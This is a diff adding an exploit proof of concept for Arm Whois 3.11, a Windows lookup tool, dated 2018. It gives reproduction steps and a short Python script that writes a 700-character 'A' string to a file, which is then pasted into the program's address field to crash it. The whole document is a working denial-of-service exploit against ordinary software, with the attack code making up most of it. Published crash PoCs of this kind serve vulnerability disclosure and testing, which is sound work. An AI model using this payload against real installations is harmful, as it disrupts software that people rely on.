@@ -1,0 +1,20 @@
+# Exploit Title: Arm Whois 3.11 - Denial of Service (PoC)
+# Date: 2018-10-31
+# Exploit Author: Yair Rodríguez Aparicio
+# Vendor Homepage: http://www.armcode.com/
+# Software Link: http://www.armcode.com/downloads/arm-whois.exe
+# Version: 3.11
+# Tested on: Windows XP Profesional Español SP3 x86 
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python whois.py
+# 2.- Open text.txt and copy content to clipboard
+# 3.- Open whois.exe
+# 4.- Paste clipboard on "IP address or domain"
+# 5.- click on "Retrieves IP-adress info"
+# 6.- Crashed!
+
+buffer = "\x41" * 700
+f = open("text.txt", "w")
+f.write(buffer)
+f.close()
